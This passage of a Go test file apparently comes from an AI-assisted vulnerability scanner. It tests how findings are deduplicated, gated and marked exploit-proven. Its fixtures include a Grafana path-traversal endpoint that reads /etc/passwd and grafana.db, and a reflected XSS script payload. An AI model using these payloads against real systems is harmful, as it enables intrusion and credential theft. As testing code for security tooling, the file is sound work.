			t.Errorf("did NOT expect concrete impact for %q", s)
		}
	}
}

// TestReportVuln_OptionalParamsHandledByGates verifies that after demoting
// exploitation_proof / verification_method / cvss from registry-required to
// optional, the tool's own severity-aware gates take over:
//   - an info finding with NO verification_method and NO cvss is accepted;
//   - a non-info finding with NO verification_method is rejected by Gate 1;
//   - any provided verification_method is still validated;
//   - a finding with NO cvss gets a default derived from its severity.
func TestReportVuln_OptionalParamsHandledByGates(t *testing.T) {
	t.Run("info finding without method/cvss is accepted", func(t *testing.T) {
		ctx := "opt-info-no-method"
		CleanupContext(ctx)
		defer CleanupContext(ctx)
		info := map[string]string{
			"title":       "Server version disclosed in response header",
			"severity":    "info",
			"description": "The server responds with a Server header revealing the exact software version.",
			"target":      "https://example.com",
			"endpoint":    "https://example.com/",
			"method":      "GET",
		}
		res, err := reportVulnWithContextID(ctx, info)
		if err != nil {
			t.Fatalf("report error: %v", err)
		}
		if strings.Contains(res.Output, "REJECTED") {
			t.Fatalf("info finding without verification_method must NOT be rejected, got: %s", res.Output)
		}
	})

	t.Run("non-info finding without method is rejected by Gate 1", func(t *testing.T) {
		ctx := "opt-high-no-method"
		CleanupContext(ctx)
		defer CleanupContext(ctx)
		args := validReportArgs()
		delete(args, "verification_method")
		res, err := reportVulnWithContextID(ctx, args)
		if err != nil {
			t.Fatalf("report error: %v", err)
		}
		if !strings.Contains(res.Output, "REJECTED") || !strings.Contains(res.Output, "verification_method") {
			t.Fatalf("high finding without verification_method must be rejected by Gate 1, got: %s", res.Output)
		}
	})

	t.Run("invalid provided method is rejected", func(t *testing.T) {
		ctx := "opt-invalid-method"
		CleanupContext(ctx)
		defer CleanupContext(ctx)
		args := validReportArgs()
		args["verification_method"] = "totally_made_up"
		res, err := reportVulnWithContextID(ctx, args)
		if err != nil {
			t.Fatalf("report error: %v", err)
		}
		if !strings.Contains(res.Output, "REJECTED") || !strings.Contains(res.Output, "Invalid verification_method") {
			t.Fatalf("invalid verification_method must be rejected, got: %s", res.Output)
		}
	})

	t.Run("missing cvss gets a default derived from severity", func(t *testing.T) {
		ctx := "opt-no-cvss"
		CleanupContext(ctx)
		defer CleanupContext(ctx)
		args := validReportArgs()
		delete(args, "cvss")
		delete(args, "cvss_vector")
		res, err := reportVulnWithContextID(ctx, args)
		if err != nil {
			t.Fatalf("report error: %v", err)
		}
		if strings.Contains(res.Output, "REJECTED") {
			t.Fatalf("finding without cvss must not be rejected, got: %s", res.Output)
		}
		v := GetVulnerabilitiesForContext(ctx)
		if len(v) != 1 {
			t.Fatalf("expected 1 stored vuln, got %d", len(v))
		}
		if v[0].CVSS <= 0 {
			t.Fatalf("expected a default CVSS derived from severity, got %v", v[0].CVSS)
		}
	})
}

func TestTemplatePathParams(t *testing.T) {
	cases := []struct{ in, want string }{
		{"/orders/1042", "/orders/{id}"},
		{"/users/9f3e1c2a-1111-2222-3333-444455556666", "/users/{id}"}, // UUID
		{"/o/deadbeefdeadbeef12345678", "/o/{id}"},                     // 24-hex ObjectId
		{"/api/v1/users", "/api/v1/users"},                             // version segment preserved
		{"/api/v2/orders/55", "/api/v2/orders/{id}"},                   // only the id templated
		{"/orders/1042/items/9", "/orders/{id}/items/{id}"},            // multiple ids
		{"/users/abc", "/users/abc"},                                   // short named slug preserved
		{"/files/0a1b2c3d", "/files/0a1b2c3d"},                         // short hex (<16) preserved
		{"/search", "/search"},                                         // no id
		{"", ""},                                                       // empty
	}
	for _, c := range cases {
		if got := templatePathParams(c.in); got != c.want {
			t.Errorf("templatePathParams(%q) = %q, want %q", c.in, got, c.want)
		}
	}
}

func TestDedupEndpointKey_NormalizesThenTemplates(t *testing.T) {
	// Uppercase + query + fragment + trailing slash, then id templating.
	got := dedupEndpointKey("https://App.example.com/Orders/1042/Items/9?x=1#frag")
	want := "https://app.example.com/orders/{id}/items/{id}"
	if got != want {
		t.Fatalf("dedupEndpointKey = %q, want %q", got, want)
	}
}

func TestFindDuplicateVulnerability_IDVariantsDedup(t *testing.T) {
	existing := []Vulnerability{{
		ID: "XALG-1", Title: "IDOR on order", Description: "idor",
		Target: "https://app.example.com", Endpoint: "/api/orders/1042",
	}}
	// Same class + same target, different object id in the path.
	dup, _, isDup := findDuplicateVulnerability(existing, "IDOR on order 2087", "idor", "", "",
		"https://app.example.com", "/api/orders/2087")
	if !isDup {
		t.Fatal("expected /api/orders/2087 to dedup against /api/orders/1042 (same IDOR endpoint)")
	}
	if dup.ID != "XALG-1" {
		t.Fatalf("expected duplicate of XALG-1, got %q", dup.ID)
	}
}

func TestFindDuplicateVulnerability_VersionNotMerged(t *testing.T) {
	existing := []Vulnerability{{
		ID: "XALG-1", Title: "IDOR", Description: "idor",
		Target: "https://app.example.com", Endpoint: "/api/v1/users/1",
	}}
	// v1 vs v2 are distinct endpoints, not object-id variants → not a duplicate.
	if _, _, isDup := findDuplicateVulnerability(existing, "IDOR", "idor", "", "",
		"https://app.example.com", "/api/v2/users/1"); isDup {
		t.Fatal("expected /api/v1 and /api/v2 to remain distinct endpoints")
	}
}

func TestFindDuplicateVulnerability_DifferentClassNotMerged(t *testing.T) {
	existing := []Vulnerability{{
		ID: "XALG-1", Title: "IDOR on orders", Description: "idor",
		Target: "https://app.example.com", Endpoint: "/api/orders/1",
	}}
	// Same templated endpoint but a different vuln class + different title.
	if _, _, isDup := findDuplicateVulnerability(existing, "SQL injection in orders", "sql injection", "", "",
		"https://app.example.com", "/api/orders/2"); isDup {
		t.Fatal("templating must not merge different vuln classes on the same endpoint")
	}
}

func TestFindDuplicateVulnerability_DifferentTargetNotMerged(t *testing.T) {
	existing := []Vulnerability{{
		ID: "XALG-1", Title: "IDOR on order", Description: "idor",
		Target: "https://app.example.com", Endpoint: "/api/orders/1042",
	}}
	// Same templated endpoint + class but a DIFFERENT host → not a duplicate.
	if _, _, isDup := findDuplicateVulnerability(existing, "IDOR on order", "idor", "", "",
		"https://other.example.com", "/api/orders/2087"); isDup {
		t.Fatal("findings on different hosts must not be merged")
	}
}

func TestFindDuplicateVulnerability_SameTargetCVEDedupsAcrossProofEndpoints(t *testing.T) {
	existing := []Vulnerability{{
		ID: "XALG-1", Title: "Unauthenticated arbitrary file read", Description: "Grafana plugin path traversal",
		CVE: "CVE-2021-43798", CWE: "CWE-22", Target: "https://grafana.example.com",
		Endpoint: "/public/plugins/alertlist/../../../../etc/passwd",
	}}
	dup, _, isDup := findDuplicateVulnerability(existing,
		"CVE-2021-43798: Grafana credential database disclosure", "The same traversal reads grafana.db",
		"cve-2021-43798", "CWE-200", "https://grafana.example.com",
		"/public/plugins/alertlist/../../../../var/lib/grafana/grafana.db")
	if !isDup || dup.ID != "XALG-1" {
		t.Fatalf("same CVE on one target should dedup across proof paths, got duplicate=%v id=%q", isDup, dup.ID)
	}
}

func TestFindDuplicateVulnerability_SameCVEDifferentTargetNotMerged(t *testing.T) {
	existing := []Vulnerability{{
		ID: "XALG-1", Title: "Grafana path traversal", CVE: "CVE-2021-43798",
		Target: "https://grafana-a.example.com", Endpoint: "/public/plugins/a/../../etc/passwd",
	}}
	if _, _, isDup := findDuplicateVulnerability(existing,
		"Grafana path traversal", "CVE-2021-43798", "CVE-2021-43798", "CWE-22",
		"https://grafana-b.example.com", "/public/plugins/a/../../etc/passwd"); isDup {
		t.Fatal("the same CVE on a different target must remain a separate finding")
	}
}

func TestExtractVulnTypeWithCWE(t *testing.T) {
	cases := []struct {
		name             string
		title, desc, cwe string
		want             string
	}{
		{"keyword wins over cwe", "Reflected XSS in search", "", "CWE-89", "xss"},
		{"cwe fallback when no keyword", "Unauthenticated contact creation", "adds a record", "CWE-79", "xss"},
		{"cwe fallback idor", "Access another account's order", "returns the record", "CWE-639", "idor"},
		{"cwe format variants", "no class keyword here", "", "79", "xss"},
		{"unmapped cwe → empty", "no class keyword here", "", "CWE-770", ""},
		{"neither → empty", "no class keyword here", "", "", ""},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			if got := extractVulnTypeWithCWE(c.title, c.desc, c.cwe); got != c.want {
				t.Fatalf("extractVulnTypeWithCWE(%q,%q,%q) = %q, want %q", c.title, c.desc, c.cwe, got, c.want)
			}
		})
	}
}

func TestFindDuplicateVulnerability_CWEFallbackDedup(t *testing.T) {
	// Neither title nor description carries an XSS keyword, but both findings
	// declare CWE-79 → the CWE fallback recognizes them as the same class on the
	// same endpoint, so the second is a duplicate.
	existing := []Vulnerability{{
		ID: "XALG-1", Title: "Unauthenticated contact creation", Description: "creates a contact record",
		CWE: "CWE-79", Target: "https://app.example.com", Endpoint: "/api/contacts",
	}}
	dup, _, isDup := findDuplicateVulnerability(existing, "Arbitrary contact addition", "adds a contact record",
		"", "CWE-79", "https://app.example.com", "/api/contacts")
	if !isDup {
		t.Fatal("expected CWE-79 findings on the same endpoint to dedup via the CWE class fallback")
	}
	if dup.ID != "XALG-1" {
		t.Fatalf("expected duplicate of XALG-1, got %q", dup.ID)
	}
}

func TestFindDuplicateVulnerability_UnmappedCWENotMerged(t *testing.T) {
	// An unmapped CWE and no class keyword → class stays "", so distinct titles
	// on the same endpoint are NOT collapsed (the fallback never over-merges).
	existing := []Vulnerability{{
		ID: "XALG-1", Title: "Odd behavior A", Description: "something happens",
		CWE: "CWE-770", Target: "https://app.example.com", Endpoint: "/api/x",
	}}
	if _, _, isDup := findDuplicateVulnerability(existing, "Odd behavior B", "something else happens",
		"", "CWE-770", "https://app.example.com", "/api/x"); isDup {
		t.Fatal("unmapped CWE + no keyword must not merge distinct findings")
	}
}

// TestLooksLikeSQLError verifies the shared DBMS-error detector matches every
// signature case-insensitively, that each signature is ALSO a concrete-impact
// indicator (the append refactor keeps verify_sqli and the reporting impact-gate
// in lockstep), and that benign / generic-error text is not flagged.
func TestLooksLikeSQLError(t *testing.T) {
	for _, sig := range dbmsErrorSignatures {
		if !LooksLikeSQLError("HTTP 500\n" + strings.ToUpper(sig) + " — query failed") {
			t.Errorf("LooksLikeSQLError should match signature %q (case-insensitive)", sig)
		}
		if !HasConcreteImpact("response body: " + sig) {
			t.Errorf("DBMS signature %q must also be a concrete-impact indicator", sig)
		}
	}
	for _, s := range []string{
		"", "HTTP 200 OK", "the endpoint returned 3 rows", "a generic error page",
		"syntax error", // generic phrase must NOT match "sql syntax"
	} {
		if LooksLikeSQLError(s) {
			t.Errorf("LooksLikeSQLError should NOT match benign text %q", s)
		}
	}
}

// TestLedgerBrowserXSSProof verifies the bridge that rescues a genuinely
// browser-confirmed XSS from the reflection-only false-positive gate: verify_xss
// records the execution proof in the shared ledger, and the report flow folds
// that authoritative proof into the finding so it is judged on real evidence
// rather than on whatever string the model pasted.
func TestLedgerBrowserXSSProof(t *testing.T) {
	sc := scanctx.New("rep-xss-bridge-test", "")
	scanctx.Activate(sc)
	defer scanctx.Deactivate(sc.ID)

	// No verify_xss confirmation yet → no bridged proof.
	if got := ledgerBrowserXSSProof(sc.ID); got != "" {
		t.Fatalf("expected empty proof before any verify_xss confirmation, got %q", got)
	}

	// Record a browser-confirmed XSS the way finalizeXSSVerdict does.
	h := sc.Ledger.Upsert(scanctx.Hypothesis{
		Title:     "Browser-confirmed XSS at /search",
		VulnClass: "xss",
		Endpoint:  "/search",
		Parameter: "q",
		Origin:    "verify_xss",
	})
	sc.Ledger.AddEvidence(h.ID, scanctx.Evidence{
		Kind:    "exploit",
		Summary: `Browser-confirmed XSS: a dialog:alert dialog carrying the nonce "XV-7a91" fired while loading http://x/search?q=<script>alert('XV-7a91')</script>.`,
	})

	got := ledgerBrowserXSSProof(sc.ID)
	if !strings.Contains(strings.ToLower(got), "browser-confirmed xss") {
		t.Fatalf("expected the browser-confirmed proof summary, got %q", got)
	}

	// The bridged proof must satisfy the reflection-only XSS gate even though the
	// description still contains the raw <script> payload (the classic drop case).
	if rej := checkFalsePositive(
		"Reflected XSS in /search?q",
		"payload <script>alert('XV-7a91')</script> reflected and executed",
		"high",
		got,
	); rej != "" {
		t.Fatalf("browser-confirmed XSS proof must pass the FP gate, got rejection: %s", rej)
	}

	// A different scan class in the ledger must not be mistaken for XSS proof.
	if !reportLooksLikeXSS("Reflected XSS in q", "", "") {
		t.Fatal("reportLooksLikeXSS should detect an XSS title")
	}
	if reportLooksLikeXSS("SQL injection in id", "error-based", "CWE-89") {
		t.Fatal("reportLooksLikeXSS must not classify SQLi as XSS")
	}
}

// TestReportVulnClass checks the finding→verifier-class mapping used to fold a
// deterministic verify_* confirmation into a report.
func TestReportVulnClass(t *testing.T) {
	cases := []struct {
		title, desc, cwe string
		want             string
	}{
		{"CSRF on POST /account/email", "forged cross-site request", "CWE-352", "csrf"},
		{"Cross-Site Request Forgery", "", "", "csrf"},
		{"Error-based SQL injection in id", "", "CWE-89", "sqli"},
		{"SQLi via search", "", "", "sqli"},
		{"Server-Side Template Injection in name", "", "CWE-1336", "ssti"},
		{"XXE in the import endpoint", "xml external entity", "CWE-611", "xxe"},
		{"Reflected XSS in q", "", "CWE-79", "xss"},
		{"IDOR on /api/orders exposes other users' data", "insecure direct object reference", "CWE-639", "idor"},
		{"BOLA: any authenticated user reads any order", "broken object level authorization", "", "idor"},
		{"Broken access control on /admin", "", "CWE-285", "idor"},
		{"Open redirect in next", "", "CWE-601", ""},
		{"Missing security header", "", "", ""},
	}
	for _, c := range cases {
		if got := reportVulnClass(c.title, c.desc, c.cwe); got != c.want {
			t.Errorf("reportVulnClass(%q,%q,%q) = %q, want %q", c.title, c.desc, c.cwe, got, c.want)
		}
	}
}

// TestLedgerVerifierProof confirms the general bridge returns a verify_*
// confirmation summary for the matching class and ignores non-verifier or
// wrong-class ledger entries.
func TestLedgerVerifierProof(t *testing.T) {
	sc := scanctx.New("rep-verifier-bridge", "")
	scanctx.Activate(sc)
	defer scanctx.Deactivate(sc.ID)

	// No confirmation yet.
	if got := ledgerVerifierProof(sc.ID, "csrf"); got != "" {
		t.Fatalf("expected empty before any confirmation, got %q", got)
	}
	// A raw probe (non-verifier origin, no "confirmed" evidence) must NOT count.
	hp := sc.Ledger.Upsert(scanctx.Hypothesis{Title: "lead", VulnClass: "csrf", Endpoint: "/probe-only", Origin: "probe_hypothesis"})
	sc.Ledger.AddEvidence(hp.ID, scanctx.Evidence{Kind: "exploit", Summary: "reflected a token; needs follow-up"})
	if got := ledgerVerifierProof(sc.ID, "csrf"); got != "" {
		t.Fatalf("a non-verify_ origin without a confirmation must not count, got %q", got)
	}
	// A genuine verify_csrf confirmation counts (origin-based match).
	h := sc.Ledger.Upsert(scanctx.Hypothesis{Title: "CSRF at /x", VulnClass: "csrf", Endpoint: "/x", Origin: "verify_csrf"})
	sc.Ledger.AddEvidence(h.ID, scanctx.Evidence{Kind: "exploit", Summary: "Cross-Site Request Forgery CONFIRMED at /x."})
	if got := ledgerVerifierProof(sc.ID, "csrf"); !strings.Contains(got, "CONFIRMED") {
		t.Fatalf("expected the verify_csrf confirmation summary, got %q", got)
	}
	// Robustness: a hypothesis whose origin is NOT verify_ (e.g. a probe the
	// verifier's Upsert merged onto) but which carries a CONFIRMED exploit
	// evidence still counts — the confirmation lives in the evidence.
	hm := sc.Ledger.Upsert(scanctx.Hypothesis{Title: "SSTI at /m", VulnClass: "ssti", Endpoint: "/m", Origin: "probe_hypothesis"})
	sc.Ledger.AddEvidence(hm.ID, scanctx.Evidence{Kind: "exploit", Summary: "Server-side template injection CONFIRMED on parameter \"q\" at /m."})
	if got := ledgerVerifierProof(sc.ID, "ssti"); !strings.Contains(got, "CONFIRMED") {
		t.Fatalf("expected the merged-origin SSTI confirmation via evidence, got %q", got)
	}
	// Class isolation: a csrf confirmation must not answer an xxe query.
	if got := ledgerVerifierProof(sc.ID, "xxe"); got != "" {
		t.Fatalf("class isolation failed: answered an xxe query with %q", got)
	}
	// authz_matrix's HIGH-confidence BOLA/IDOR signal (a lower identity got the
	// SAME successful response — its exploit summary says "broken access
	// control") counts as an idor confirmation.
	ha := sc.Ledger.Upsert(scanctx.Hypothesis{Title: "role B can access /api/orders/1001", VulnClass: "idor", Endpoint: "/api/orders/1001", Origin: "authz_matrix"})
	sc.Ledger.AddEvidence(ha.ID, scanctx.Evidence{Kind: "exploit", Summary: "role A → status 200, 88 bytes; role B (second account) got status 200 / 88 bytes for the same request — SAME successful response as the authorized identity — likely broken access control"})
	if got := ledgerVerifierProof(sc.ID, "idor"); !strings.Contains(got, "broken access control") {
		t.Fatalf("expected the authz_matrix broken-access confirmation, got %q", got)
	}
}

// TestLedgerVerifierProof_AuthzMatrixWeakSignalIgnored ensures the authz_matrix
// WEAK heuristic ("accessible while the baseline was not successful — verify")
// is NOT treated as proof — that differential can simply be the other
// identity's own object, so it must not auto-mark a finding exploit-proven.
func TestLedgerVerifierProof_AuthzMatrixWeakSignalIgnored(t *testing.T) {
	sc := scanctx.New("rep-authz-weak", "")
	scanctx.Activate(sc)
	defer scanctx.Deactivate(sc.ID)

	hw := sc.Ledger.Upsert(scanctx.Hypothesis{Title: "role B can access /api/orders/2002", VulnClass: "idor", Endpoint: "/api/orders/2002", Origin: "authz_matrix"})
	sc.Ledger.AddEvidence(hw.ID, scanctx.Evidence{Kind: "exploit", Summary: "role A → status 403, 0 bytes; role B got status 200 / 90 bytes for the same request — accessible (2xx) while the authorized baseline was not successful — verify"})
	if got := ledgerVerifierProof(sc.ID, "idor"); got != "" {
		t.Fatalf("authz_matrix weak heuristic must NOT count as proof, got %q", got)
	}
}

// TestReportVuln_VerifierLedgerProofMarksExploitProven is the integration
// guarantee: a deterministic verify_csrf confirmation in the ledger makes the
// reported CSRF finding exploit-proven (Verified=true, TagExploitProven) even
// when the independent LLM verifier is inconclusive and the pasted proof has no
// concrete-impact marker on its own — closing the gap where a confirmed CSRF was
// wrongly flagged needs-manual-verification.
func TestReportVuln_VerifierLedgerProofMarksExploitProven(t *testing.T) {
	ctx := "verifier-ledger-csrf"
	CleanupContext(ctx)
	defer CleanupContext(ctx)

	sc := scanctx.New(ctx, "https://example.com")
	scanctx.Activate(sc)
	defer scanctx.Deactivate(ctx)

	h := sc.Ledger.Upsert(scanctx.Hypothesis{
		Title:     "Cross-Site Request Forgery at /account/email",
		VulnClass: "csrf",
		Endpoint:  "/account/email",
		Origin:    "verify_csrf",
		Status:    scanctx.HypothesisTesting,
	})
	sc.Ledger.AddEvidence(h.ID, scanctx.Evidence{
		Kind:       "exploit",
		Summary:    "Cross-Site Request Forgery CONFIRMED at /account/email: the server accepted a state-changing POST with a forged cross-site Origin and no anti-CSRF token (CWE-352).",
		Confidence: 0.75,
		AgentID:    "agent",
	})

	// Independent verifier is inconclusive → without the ledger bridge this would
	// be flagged needs-manual-verification.
	SetFindingVerifier(ctx, func(VerificationRequest) VerificationVerdict {
		return VerificationVerdict{Inconclusive: true, Reason: "no cross-site browser context to replay"}
	})

	args := map[string]string{
		"title":               "CSRF on POST /account/email",
		"severity":            "high",
		"description":         "The change-email endpoint accepts a POST request from any origin with no anti-CSRF token, letting an attacker page change the victim's account email.",
		"exploitation_proof":  "the endpoint accepted the forged cross-origin request and returned HTTP 200",
		"verification_method": "exploited",
		"impact":              "Account email takeover via a forged cross-site request.",
		"target":              "https://example.com",
		"endpoint":            "https://example.com/account/email",
		"method":              "POST",
		"cwe_id":              "CWE-352",
		"cvss":                "4.3",
		"cvss_vector":         "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N",
	}
	res, err := reportVulnWithContextID(ctx, args)
	if err != nil {
		t.Fatalf("report error: %v", err)
	}
	vulns := GetVulnerabilitiesForContext(ctx)
	if len(vulns) != 1 {
		t.Fatalf("expected 1 vuln persisted, got %d (%s)", len(vulns), res.Output)
	}
	if !vulns[0].Verified {
		t.Fatalf("expected Verified=true from the verify_csrf ledger proof; tags=%v output=%s", vulns[0].Tags, res.Output)
	}
	if !containsTag(vulns[0].Tags, TagExploitProven) {
		t.Fatalf("expected TagExploitProven from the verifier ledger proof, got tags=%v", vulns[0].Tags)
	}
	if strings.Contains(res.Output, "RECORDED as UNVERIFIED") {
		t.Fatalf("must NOT flag manual review when a deterministic verifier confirmed it, got: %s", res.Output)
	}
}

// TestReportVuln_AuthzMatrixIDORExploitProven is the integration guarantee for
// BOLA/IDOR: an authz_matrix HIGH-confidence cross-identity confirmation in the
// ledger makes the reported IDOR finding exploit-proven (Verified=true,
// TagExploitProven) even when the independent LLM re-verifier is inconclusive
// (routine — it has no second session to replay) — so a deterministically
// confirmed BOLA is no longer buried under needs-manual-verification.
func TestReportVuln_AuthzMatrixIDORExploitProven(t *testing.T) {
	ctx := "authz-ledger-idor"
	CleanupContext(ctx)
	defer CleanupContext(ctx)

	sc := scanctx.New(ctx, "https://example.com")
	scanctx.Activate(sc)
	defer scanctx.Deactivate(ctx)

	h := sc.Ledger.Upsert(scanctx.Hypothesis{
		Title:     "role B can access /api/orders/1001",
		VulnClass: "idor",
		Endpoint:  "/api/orders/1001",
		Role:      "role-b",
		Origin:    "authz_matrix",
		Status:    scanctx.HypothesisTesting,
	})
	sc.Ledger.AddEvidence(h.ID, scanctx.Evidence{
		Kind:    "exploit",
		Summary: "role A → status 200, 88 bytes; role B (second account) got status 200 / 88 bytes for the same request — SAME successful response as the authorized identity — likely broken access control",
		AgentID: "authz_matrix",
	})

	// The independent verifier can't reproduce it (no second session on re-test).
	SetFindingVerifier(ctx, func(VerificationRequest) VerificationVerdict {
		return VerificationVerdict{Inconclusive: true, Reason: "no second session to replay"}
	})

	args := map[string]string{
		"title":               "IDOR / BOLA on /api/orders/{id}",
		"severity":            "high",
		"description":         "Any authenticated user can read any order by id; a second account retrieved another user's order.",
		"exploitation_proof":  "Replayed the order request as a second account (role B) and received another user's order data including card_last4 — identical to the owner's response.",
		"verification_method": "data_extracted",
		"impact":              "Horizontal access to any user's order and PII.",
		"target":              "https://example.com",
		"endpoint":            "https://example.com/api/orders/1001",
		"method":              "GET",
		"cwe_id":              "CWE-639",
		"cvss":                "6.5",
		"cvss_vector":         "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
	}
	res, err := reportVulnWithContextID(ctx, args)
	if err != nil {
		t.Fatalf("report error: %v", err)
	}
	vulns := GetVulnerabilitiesForContext(ctx)
	if len(vulns) != 1 {
		t.Fatalf("expected 1 vuln persisted, got %d (%s)", len(vulns), res.Output)
	}
	if !vulns[0].Verified {
		t.Fatalf("expected Verified=true from the authz_matrix ledger proof; tags=%v output=%s", vulns[0].Tags, res.Output)
	}
	if !containsTag(vulns[0].Tags, TagExploitProven) {
		t.Fatalf("expected TagExploitProven from the authz_matrix confirmation, got tags=%v", vulns[0].Tags)
	}
	if strings.Contains(res.Output, "RECORDED as UNVERIFIED") {
		t.Fatalf("must NOT flag manual review when authz_matrix confirmed it, got: %s", res.Output)
	}
}
